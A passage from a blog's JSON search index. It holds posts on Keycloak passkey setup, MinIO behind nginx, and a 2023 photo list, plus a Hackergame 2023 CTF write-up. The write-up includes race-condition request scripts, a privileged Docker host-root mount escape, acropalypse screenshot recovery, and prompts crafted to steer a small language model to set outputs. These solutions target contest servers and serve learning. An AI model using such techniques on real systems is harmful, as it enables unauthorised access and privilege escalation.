https://www.youtube.com/watch?v=PPoaPsfYGwQ ","permalink":"https://blog.sparktour.me/posts/2024/01/24/add-passkey-webauth-otp-support-to-keycloak/","summary":"\u003cp\u003e本文描述了为keycloak配置\u003ca href=\"https://fidoalliance.org/passkeys/\"\u003epasskey\u003c/a\u003e，webauth，\u003ca href=\"https://en.wikipedia.org/wiki/One-time_password\"\u003eOTP\u003c/a\u003e等无密码登陆的流程。本文中的部分配置可能需要\u003ca href=\"https://www.keycloak.org/docs/latest/release_notes/index.html#passkeys-support\"\u003eKeycloak 23\u003c/a\u003e或者更高的版本才能正常运行。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"配置authentication部分\"\u003e配置Authentication部分\u003c/h2\u003e\n\u003cp\u003e在keycloak的\u003ccode\u003eAuthentication - Flow\u003c/code\u003e菜单中，复制一份browser flow，笔者把副本取名为了\u003ccode\u003ebrowser with optional webauth and otp\u003c/code\u003e。\u003c/p\u003e","title":"为keycloak添加可选的passkey/webauth/OTP登陆"},{"content":"尽管Minio在文档中明确说明了minio的S3 API并不支持host在subpath下。但如果真的有需求，我们也可以通过修改nginx的反向代理配置来实现这一点。此方法唯一存在的问题是，bucket的名字需要拥有某个共同的前缀。\nMinio配置 minio的docker-compose配置如下：\nversion: \u0026#39;3.6\u0026#39; services: minio: image: quay.io/minio/minio:latest container_name: minio-ssd-backend restart: always ports: - \u0026#34;39000:9000\u0026#34; - \u0026#34;39090:9090\u0026#34; volumes: - /your-local-data/minio/data:/data environment: MINIO_ROOT_USER: admin MINIO_ROOT_PASSWORD: change-me MINIO_SERVER_URL: https://maindomain.example.com MINIO_BROWSER_REDIRECT_URL: https://console.example.com command: server /data --console-address=:9090 MINIO_SERVER_URL：minio会用这个url来计算签名。 MINIO_BROWSER_REDIRECT_URL：console会host在这个url下，如果熟悉mc客户端的话，不需要console也可以进行绝大部分的配置。 Nginx配置 nginx配置可以参考minio的文档。由于我们的maindomain.example.com中可能还有其他的服务，所以我们只需要把带bucket前缀（假设这里的前缀是bucket-prefix）的请求和minio控制的相关请求反向代理给minio即可。具体来说，需要在相应域名的配置中添加以下的两端配置\n# reverse proxy minio api # To allow special characters in headers location ^~ /minio/ { proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; client_max_body_size 5000M; proxy_connect_timeout 300; # Default is HTTP/1, keepalive is only enabled in HTTP/1.1 proxy_http_version 1.1; proxy_set_header Connection \u0026#34;\u0026#34;; chunked_transfer_encoding off; proxy_pass http://localhost:39000; # If you are using docker-compose this would be the hostname i.e. minio } #reverse proxy bucket prefix location ^~ /bucket-prefix { proxy_hide_header Access-Control-Allow-Origin; add_header \u0026#39;Access-Control-Allow-Origin\u0026#39; \u0026#39;*\u0026#39;; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; client_max_body_size 5000M; proxy_connect_timeout 300; # Default is HTTP/1, keepalive is only enabled in HTTP/1.1 proxy_http_version 1.1; proxy_set_header Connection \u0026#34;\u0026#34;; chunked_transfer_encoding off; proxy_pass http://localhost:39000; # If you are using docker-compose this would be the hostname i.e. m\u0026gt; } 有关console面板的访问 由于console面板会在用户登录时，给minio的MINIO_SERVER_URL的/ 和/api下POST 请求，如果主网站的相关endpoint已经被其他服务占用，那web面板将无法正常登陆，但我们依然可以用minio的客户端mc进行bucket和文件的操作。\n使用mc操作对象存储 将主域名的url作为s3 api配置在minio中即可：\nmc alias set minio-s3 https://maindomain.example.com admin password-change-me 如果只是需要往存储桶里上传或下载文件，常见的s3客户端均支持这种配置，只要把s3的域名配置成主域名即可。\n多域名 如果希望从其他的域名访问minio，可以在配置其他域名的nginx的时候把proxy_set_header Host $http_host;写死，这里的your-s3-domain.com是minio中配置的s3-api的域名：\nproxy_set_header Host your-s3-domain.com; 其他 由于minio后端和mc的User Agent都是已知的（后端是Go-http-client，mc是minio-go，理论上我们也可以根据User Agent将api和根目录页面反代给minio后端。\n参考 https://min.io/docs/minio/linux/reference/minio-server/settings/core.html#domain https://min.io/docs/minio/linux/integrations/setup-nginx-proxy-with-minio.html https://github.com/minio/minio/discussions/18134 https://github.com/minio/minio/discussions/14077 ","permalink":"https://blog.sparktour.me/posts/2024/01/13/host-minio-s3-under-subpath-and-multi-domain/","summary":"\u003cp\u003e尽管Minio在文档中明确说明了minio的S3 API\u003ca href=\"https://min.io/docs/minio/linux/integrations/setup-nginx-proxy-with-minio.html#:~:text=The%20S3%20API%20signature%20calculation%20algorithm%20does%20not%20support%20proxy%20schemes%20where%20you%20host%20the%20MinIO%20Server%20API%20on%20a%20subpath%2C%20such%20as%20minio.example.net/s3/.\"\u003e并不支持host在subpath下\u003c/a\u003e。但如果真的有需求，我们也可以通过修改nginx的反向代理配置来实现这一点。此方法唯一存在的问题是，bucket的名字需要拥有某个共同的前缀。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"minio配置\"\u003eMinio配置\u003c/h2\u003e\n\u003cp\u003eminio的docker-compose配置如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eversion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;3.6\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eservices\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eminio\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003equay.io/minio/minio:latest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainer_name\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eminio-ssd-backend\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003erestart\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ealways\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e- \u003cspan class=\"s2\"\u003e\u0026#34;39000:9000\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e- \u003cspan class=\"s2\"\u003e\u0026#34;39090:9090\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumes\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e- \u003cspan class=\"l\"\u003e/your-local-data/minio/data:/data\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eenvironment\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eMINIO_ROOT_USER\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eadmin\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eMINIO_ROOT_PASSWORD\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003echange-me\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eMINIO_SERVER_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ehttps://maindomain.example.com\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eMINIO_BROWSER_REDIRECT_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ehttps://console.example.com\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eserver /data --console-address=:9090\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eMINIO_SERVER_URL\u003c/code\u003e：minio会用这个url来计算签名。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eMINIO_BROWSER_REDIRECT_URL\u003c/code\u003e：console会host在这个url下，如果熟悉mc客户端的话，不需要console也可以进行绝大部分的配置。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"nginx配置\"\u003eNginx配置\u003c/h2\u003e\n\u003cp\u003enginx配置可以参考\u003ca href=\"https://min.io/docs/minio/linux/integrations/setup-nginx-proxy-with-minio.html\"\u003eminio的文档\u003c/a\u003e。由于我们的\u003ccode\u003emaindomain.example.com\u003c/code\u003e中可能还有其他的服务，所以我们只需要把带bucket前缀（假设这里的前缀是\u003ccode\u003ebucket-prefix\u003c/code\u003e）的请求和minio控制的相关请求反向代理给minio即可。具体来说，需要在相应域名的配置中添加以下的两端配置\u003c/p\u003e","title":"Host the MinIO Server API on a subpath and Configure Multi Domain"},{"content":"所有照片按照时间排列，没有做过任何后期处理。这次使用了avif作为图片容器格式，或许能正确地在网上显示手机拍出来的HDR效果\n2023年1月，广东，乘船经过港珠澳大桥桥底 2023年1月，香港，写上“你好香港”但空无一人的邮轮码头 2023年4月，广州，关闭的广州东站直通车候车室和地面上指向前往西九龙站高铁的指示牌 2023年6月，香港，维多利亚公园“家乡市集” 2023年6月，从飞机上看深圳西部 2023年6月，爱沙尼亚Narva湾，俄罗斯领空和欧盟空域交界处 2023年6月，巴黎，埃菲尔铁塔下的单向门，写着“只是出口”的机翻 2023年6月，塔林，体育馆旁的码头 2023年6月，赫尔辛基，一处路牌 2023年7月，深圳，宝安一处写着不同城市距离和交通标志的装置艺术 2023年7月，深圳，塘朗日落 2023年8月，上海，下午的外滩 2023年8月，云南，洱海边的火把节 2023年8月，云南，泸沽湖 2023年11月，澳门，通往港珠澳大桥的巴士 2023年12月，汕头，南澳岛一处卖咖啡的三轮车 ","permalink":"https://blog.sparktour.me/posts/2023/12/31/2023-in-photos/","summary":"\u003cp\u003e\u003cem\u003e所有照片按照时间排列，没有做过任何后期处理。这次使用了avif作为图片容器格式，或许能正确地在网上显示手机拍出来的HDR效果\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2023/2023-in-photos/202301_hzm.avif\" alt=\"2023年1月，广东，乘船经过港珠澳大桥桥底\"  /\u003e\n    \u003cfigcaption\u003e2023年1月，广东，乘船经过港珠澳大桥桥底\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e","title":"照片里的2023"},{"content":"这是本人第四次参加USTC的hackergame了233，有赖今年许多题目正好和运维和环境学知识相关和ChatGPT的横空出世，本人的排名总算第一次进了前100。\n做出来的部分 Hackergame 启动 https://cnhktrz3k5nc.hack-challenge.lug.ustc.edu.cn:13202/?similarity= 注意到网页有一个similarity=的param，提交similarity=100即可\n猫咪小测 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）\n在USTC的图书馆网站上找书名，即可看到这本书在“西区外文书库”。再google一下就能发现书库在12层：\nUSTC图书馆查询到的图书位置截图 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？\ngoogle后找到了 你见过哪些极品论文？ - 知乎 (zhihu.com)，里面直接提到了是23次方。\n为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？（20 分）\ngoogle “tcp bbr kernel config”能找到CONFIG_TCP_CONG_BBR。\n🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？\n搜mypy python type checking \u0026quot;halting problem\u0026quot;，就能找到 https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf ，url里就能看到会议叫ECOOP了。\n更深更暗 打开elements搜flag{即可\n查看网页元素 旅行照片 3.0 **你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd）**吃拉面的照片可以看出“学长”去的是STATPHYS28 （https://statphys28.org/），一天一天试可以试出是2023-08-10\n**在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研究所缩写是什么？**找东京大学获得诺贝尔奖的教授，可以找到比较年轻的那位是Takaaki Kajita - Wikipedia，工作研究所是ICRR\n**帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？**文中提到了“当你们走到一座博物馆前时， 马路对面的喷泉和它周围的景色引起了你的注意。”，在google地图上的上野站附近看了一下之后发现这个喷泉比较接近“上野公园大喷水”，搜索“上野公園 竹の台広場 (噴水広場) 2023-08-10”可以搜到４年ぶりの開催！「全国梅酒まつりin東京2023」を上野公園噴水広場にて開催！北から南まで日本全国の酒蔵が造る美味しい「梅酒」１７０種類以上を飲み比べ。｜一般社団法人梅酒研究会のプレスリリース (prtimes.jp)，里面就能找到志愿者的的报名网页https://ws.formzu.net/dist/S495584522/。\n上野公园的google地图 学长购买自己的博物馆门票时，花费了多少日元？东京国立博物馆大学生免费（0）\n**学长当天晚上需要在哪栋标志性建筑物的附近集合呢？**查STATPHYS28的网站能找到在集合地点在安田讲堂。\n**进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）**搜ボタン＆カフリンクス 上野駅能搜到这个instagram post，里面是熊猫；用google lens识别最后一张图能搜到这个装饰在Super Mario Bros.Shop ，在渋谷駅旁边，搜渋谷駅 3d 动物能找到动物是秋田犬\ngoogle lens的识别结果 赛博井字棋 理论上跟正确实现算法的AI下棋，最多只能平局。因此翻阅js，注意到了它发送棋盘的请求是阻塞的：\nasync run() { if (this.isRunning || this.queue.length === 0) { return; } this.isRunning = true; const { func, context, args, resolve, reject } = this.queue.shift(); try { const result = await func.apply(context, args); resolve(result); } catch (error) { reject(error); } this.isRunning = false; this.run(); } 那猜测直接快速发下三个连起来的棋位置的请求，就能赢了：\n# convert above curl to python requests url = \u0026#39;http://202.38.93.111:10077\u0026#39; # create new session s = requests.Session() cookies = {\u0026#39;session\u0026#39;: \u0026#39;.eJyr...\u0026#39;} # post with cookie and data {\u0026#34;x\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;y\u0026#34;:\u0026#34;1\u0026#34;} # 发送的足够快就行 headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} r = s.post(url, cookies=cookies, headers=headers, data=\u0026#39;{\u0026#34;x\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;y\u0026#34;:\u0026#34;1\u0026#34;}\u0026#39;) r = s.post(url, cookies=cookies, headers=headers, data=\u0026#39;{\u0026#34;x\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;y\u0026#34;:\u0026#34;1\u0026#34;}\u0026#39;) r = s.post(url, cookies=cookies, headers=headers, data=\u0026#39;{\u0026#34;x\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;y\u0026#34;:\u0026#34;1\u0026#34;}\u0026#39;) print(r.text) # {\u0026#34;board\u0026#34;:[[1,-1,0],[0,-1,0],[0,-1,0]],\u0026#34;msg\u0026#34;:\u0026#34;flag{I_can_eat_your_pieces_7843afed75}\u0026#34;} 奶奶的睡前 flag 故事 题目提到了谷歌的『亲儿子』(pixel)，连系统都没心思升级，截图。搜索pixel screenshot cve能搜到NVD - CVE-2023-35671 (nist.gov)，即pixel的截图程序不会把裁剪的部分从数据里删除，有隐私泄漏风险。随后在网上找到了acropalypse poc的网页实现，把图传上去，设置长宽为1080*2400即可恢复：\n恢复后的截图 组委会模拟器 第一次请求就会拿到这1000条消息的列表，然后根据消息发出的delay发撤回的请求就行：\nurl = \u0026#39;http://202.38.93.111:10021/api/getMessages\u0026#39; def send_callback(msgid): url = \u0026#34;http://202.38.93.111:10021/api/deleteMessage\u0026#34; headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} data = {\u0026#39;id\u0026#39;: msgid} response = requests.post(url, cookies=cookies, headers=headers, data=json.dumps(data)) # print resp print(response.text) # create new request session session = requests.Session() response = session.post(url, cookies=cookies) # dump to json resp_json = response.json() start_time = time.time() item_id = 0 for item in resp_json[\u0026#39;messages\u0026#39;]: # 计算自上一个条目以来已经过去的时间 elapsed_time = time.time() - start_time # 计算还需要等待多长时间 delay = item[\u0026#39;delay\u0026#39;] - elapsed_time if delay \u0026gt; 0: time.sleep(delay) text = item[\u0026#39;text\u0026#39;] match = re.search(r\u0026#39;hack\\[([a-zA-Z]*)\\]\u0026#39;, text) if match: print(delay, text) # id is the index of the message id = item_id send_callback(id) item_id += 1 # sleep 3 seconds time.sleep(3) flag_resp = session.post(\u0026#39;http://202.38.93.111:10021/api/getflag\u0026#39;, cookies=cookies) print(flag_resp.text) #{\u0026#34;flag\u0026#34;:\u0026#34;flag{Web_pr0gra_mm1ng_9386f773ee_15fun}\u0026#34;,\u0026#34;success\u0026#34;:true} 虫 听起来很像是解SSTV的题目，在网上找了https://github.com/colaclanth/sstv.git直接转换就能解出了：\nresult-sstv JSON ⊂ YAML? JSON ⊄ YAML 1.1 在What valid JSON files are not valid YAML 1.1 files? - Stack Overflow找到了12345e999。\nJSON ⊄ YAML 1.2 翻到了I accidentally used YAML.parse instead of JSON.parse and it worked | Hacker News (ycombinator.com)和YAML Ain’t Markup Language (YAML™) Version 1.2，他们提到了：\nJSON\u0026rsquo;s RFC4627 requires that mappings keys merely “SHOULD” be unique, while YAML insists they “MUST” be. Technically, YAML therefore complies with the JSON spec, choosing to treat duplicates as an error. In practice, since JSON is silent on the semantics of such duplicates, the only portable JSON files are those with unique keys, which are therefore valid YAML files.\n那构造一个有两个一样的key的json就行：\n{\u0026#34;a\u0026#34;: 1,\u0026#34;a\u0026#34;: 1} Git? Git! # git reflog ea49f0c (HEAD -\u0026gt; main) HEAD@{0}: commit: Trim trailing spaces 15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~ 505e1a3 HEAD@{2}: commit: Trim trailing spaces 15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git # git reset --hard 505e1a3 一个一个找就能看到README.md里有 \u0026lt;!-- flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t} --\u0026gt;了\nHTTP 集邮册 [100, 200, 206, 304, 400, 404, 405, 412, 413, 414, 416, 505] 没有状态……哈？（非预期） 用CONNECT/TRACE似乎都可以做到（做的时候想起来了“HTTP代理”）\nCONNECT / \\r\\nHost: a.com\\r\\n\\r\\n 5/12 种状态码 100 Continue GET / HTTP/1.1\\r\\n Expect: 100-continue\\r\\n Host: example.com\\r\\n\\r\\n 200 OK GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 206 Partial Content 读取一个文件的部分区间\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n Connection: close\\r\\n\\r\\n 304 Not Modified 自某个etag后没有修改过\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-None-Match: \u0026#34;64dbafc8-267\u0026#34;\\r\\n Connection: close\\r\\n\\r\\n 400 Bad Request HTTP换成乱七八糟的东西就行\nGET / FOO/1.1\\r\\n Host: example.com\\r\\n Connection: close\\r\\n\\r\\n 404 Not Found GET /notexist HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed 在不支持POST的地方POST\nPOST / HTTP/1.1\\r\\n Host: example.com\\r\\n Connection: close\\r\\n\\r\\n 412 Precondition Failed 和304类似，但时间取一个很久以前（文件创建之前）的时间\nGET /index.html HTTP/1.1\\r\\n Host: example.com\\r\\n If-Unmodified-Since: Sun, 15 Apr 2018 20:00:00 GMT\\r\\n\\r\\n 413 Payload Too Large 设置一个过长的Content-Length\nGET / HTTP/1.1\\r\\n Content-Length: 10000000000\\r\\n Host: example.com\\r\\n\\r\\n 414 URI Too Long 设置一个过长的URL（在默认配置里是大于8192字节的样子）\nGET /long-url-over-8000-words/ HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 416 Range Not Satisfiable 和206类似，但取一个不存在的range\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=999-9999\\r\\n Connection: close\\r\\n\\r\\n 505 HTTP Version Not Supported 发服务器不认识的http版本\nGET / HTTP/114514\\r\\n Host: example.com\\r\\n Connection: close\\r\\n\\r\\n Docker for Everyone 用--privileged启动docker并把根目录挂进docker找就可以了：\ndocker run -it -v /:/host-root —-privileged alpine 挂载根目录 惜字如金 2.0 生成cod_dict的那部份每行只有23个char，那理论上每行只要加一个char就行了，然后硬凑就可以（可以通过前面的flag{和后面的}号来寻找缺的部分大概应该插入在什么位置。\n高频率星球 先把asciinema的录制文件输出到文本，然后替换掉那些重叠和看起来像是乱码的部分，可以用js检查器检查一下（或者用asciinema录制最开头的时候提到的sha256）\nasciinema play /Users/cyf/Downloads/hackergame-23/asciinema_restore.rec \u0026gt; output.txt 检查好了运行js即可：\n#node op.js flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371} 小型大语言模型星球 You Are Smart # input John likes to repeat what other saying. One day, Julia says \u0026#34;you are smart\u0026#34; to john, and John replied: # reply \u0026#34;you are smart, too\u0026#34;. They both laugh and hug each other. John and Julia have been playing together all day, and they are 👏👏👏 flag1: flag{I-thINk-yOU-@rE-rEaLlY-rE4L1Y-Sm@RT} 👏👏👏 Accepted 从TinyStories-train.txt · roneneldan/TinyStories at main (huggingface.co)下载一下train的训练集，然后在训练集里找出accepted前面的8个char，一个一个输入模型试。\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, GenerationConfig import torch import pickle from tqdm.notebook import trange, tqdm device = \u0026#34;cuda:0\u0026#34; if torch.cuda.is_available() else \u0026#34;cpu\u0026#34; model = AutoModelForCausalLM.from_pretrained(\u0026#39;./TinyStories-33M\u0026#39;) model = model.to(device) tokenizer = AutoTokenizer.from_pretrained(\u0026#34;./TinyStories-33M\u0026#34;) # load counts_lst.pkl with open(\u0026#39;./counts_lst.pkl\u0026#39;, \u0026#39;rb\u0026#39;) as f: counts_lst = pickle.load(f) for i in trange(len(counts_lst)): prompt = counts_lst[i][0][0:7] input_ids = tokenizer.encode(prompt, return_tensors=\u0026#34;pt\u0026#34;).to(device) output = model.generate(input_ids, num_beams=1, max_new_tokens=30,pad_token_id=tokenizer.eos_token_id) output_text = tokenizer.decode(output[0], skip_special_tokens=True) # if output contains \u0026#34;accepted\u0026#34;, print it if \u0026#34;accepted\u0026#34; in output_text: print(prompt) print(output_text) print() 能找到以下的输入输出对：\natively atively accepted the challenge. The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed Apology Apology accepted. She was so happy and excited. She thanked the old man and ran off to show her friends her new toy. The moral of 随意输入一个进网页即可：\n# input atively # reply accepted the challenge. The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed 🎉🎉🎉 flag2: flag{yOU-@R3-@cCepT3D-tO-C0nt1Nu3-THe-g4M3} 🎉🎉🎉 流式星球 从题目给的转换脚本来看，转换脚本把输入的视频转换成了一个n*1的numpy数组，因此可以写一个函数从这个数组里转换回帧（注意颜色通道还要占用*3）。这个脚本是笔者在写了框架之后请chatgpt写的，效果意外的不错（至少能用）\nimport cv2 import numpy as np # Path to the binary file binary_file_path = \u0026#34;video.bin\u0026#34; # Reading the content of the binary file with open(binary_file_path, \u0026#34;rb\u0026#34;) as f: video_data = np.frombuffer(f.read(), dtype=np.uint8) def restore_video(data, frame_count, width, height, output_file=\u0026#34;restored_video.mp4\u0026#34;, frame_rate=10): \u0026#34;\u0026#34;\u0026#34; Try to restore the video from the given data using the specified parameters. :param data: NumPy array containing the video data :param frame_count: Number of frames in the video :param width: Width of each frame :param height: Height of each frame :param output_file: Name of the output video file :return: None \u0026#34;\u0026#34;\u0026#34; # Calculate the total number of pixels in the video total_pixels = frame_count * width * height * 3 # Check if we have enough data to fill the video if data.size \u0026lt; total_pixels: print(f\u0026#34;Not enough data to fill the video. Missing {total_pixels - data.size} pixels.\u0026#34;) return # Trim the data to fit the video exactly print(\u0026#34;data used percentage:\u0026#34;, total_pixels / data.size * 100) data = data[:total_pixels] # Reshape the data to create the video frames frames = data.reshape((frame_count, height, width, 3)) # Define the codec and create a video writer object fourcc = cv2.VideoWriter_fourcc(*\u0026#34;mp4v\u0026#34;) out = cv2.VideoWriter(output_file, fourcc, frame_rate, (width, height)) # Write each frame to the video file for i in range(frame_count): out.write(frames[i].astype(np.uint8)) # Release the video writer object out.release() print(\u0026#34;Video restored and saved to\u0026#34;, output_file) # return first frame return frames.astype(np.uint8) # Example usage: restore_video(video_data, 300, 640, 480) # Note: The frame_count, width, and height parameters are just examples and need to be adjusted. width = 640 frame_count=138 frame = restore_video(video_data_padded, frame_count,width , 510, frame_rate=10) 